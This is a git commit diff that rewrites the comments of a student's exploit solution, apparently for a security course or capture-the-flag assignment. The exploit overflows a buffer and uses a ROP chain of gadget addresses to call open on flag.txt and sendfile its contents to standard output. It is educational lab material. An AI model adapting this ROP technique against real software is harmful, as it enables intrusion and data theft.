9158a8b07fd34eae076beb456366f58432a786d5
NikoMrs <mores.nicola@gmail.com>
2024-05-26 16:00:27 +0200

    refactor comments

--- Assignment9/solution.py
+++ Assignment9/solution.py
@@ -12,13 +12,13 @@ else:
     #gdb.attach(conn)
 
 offset = 72
-payload = b"A" * offset
+payload = b"A" * offset         # First we create a payload that will lead to an overflow
+
+
+# Useful Gadgets:
 
 mov_rax_2_syscall = 0x000000000040119f      #: mov rax, 2; syscall; ret;
 mov_rax_40_syscall = 0x00000000004011a9     #: mov rax, 0x28; syscall; nop; pop rbp; ret;
-syscall = 0x00000000004011a6                #: syscall; ret; 
-
-nop_ret = 0x000000000040111f                #: nop; ret;
 
 pop_r10 = 0x000000000040119c    #: pop r10; ret; 
 pop_rbp = 0x000000000040111d    #: pop rbp; ret; 
@@ -26,26 +26,27 @@ pop_rdi = 0x0000000000401196    #: pop rdi; ret;
 pop_rdx = 0x000000000040119a    #: pop rdx; ret; 
 pop_rsi = 0x0000000000401198    #: pop rsi; ret;
 
-file_name = "flag.txt"                      # Ricorda sempre il \x00 finale
-filename_addr = 0x4020 + 0x400000
+filename_addr = 0x404020        # Retrieved using Ghidra's string search
 print(hex(filename_addr))
 
-# Idea: Apro il file (syscall 2) e poi copio i contenuti verso lo STDOUT (syscall 40)
+# Idea: We open the file (syscall 2) and then we copy its content to STDOUT (syscall 40)
 
-payload += p64(pop_rdi) + p64(filename_addr)    # Apro il file flag.txt
-payload += p64(pop_rsi) + p64(0)                # Flag
-payload += p64(pop_rdx) + p64(0)
-payload += p64(mov_rax_2_syscall)               # Il file aperto, avrà come fd il fd più alto fino al momento + 1
+# Open the file flag.txt
+payload += p64(pop_rdi) + p64(filename_addr)    # Put the address of the filename in the register rdi
+payload += p64(pop_rsi) + p64(0)                # Put the value 0 in rsi (contains flags)
+payload += p64(pop_rdx) + p64(0)                # Put the value 0 in rdx (contains mode used for opening the file)
+payload += p64(mov_rax_2_syscall)               # Put the value 2 in rax, then execute a syscall (open syscall)
 
-target_file_fd = 6
+target_file_fd = 6                              # The file decriptor will be the previous max + 1
 
-payload += p64(pop_rdi) + p64(1)                # Copio il file verso STDOUT
-payload += p64(pop_rsi) + p64(target_file_fd)
-payload += p64(pop_rdx) + p64(0)
-payload += p64(pop_r10) + p64(100)
-payload += p64(mov_rax_40_syscall)
+# Copy the file towards STDOUT
+payload += p64(pop_rdi) + p64(1)                # Put the value 1 (= STDOUT) in rdi (contains the output file descriptor)                
+payload += p64(pop_rsi) + p64(target_file_fd)   # Put the value <target_file_fd> in rsi (contains the input file descriptor)
+payload += p64(pop_rdx) + p64(0)                # Put the value 0 in rdx (contains the offset after which it will start coping the content)
+payload += p64(pop_r10) + p64(100)              # Put the value 100 in r10 (contians the number of bytes it will copy)
+payload += p64(mov_rax_40_syscall)              # Put the value 40 in rax, then execute a syscall (sendfile syscall)
 
-conn.sendline(payload)
+conn.sendline(payload)                          # Send the payload, retrieve the flag and print it
 
 flag = conn.recvline().decode()
 
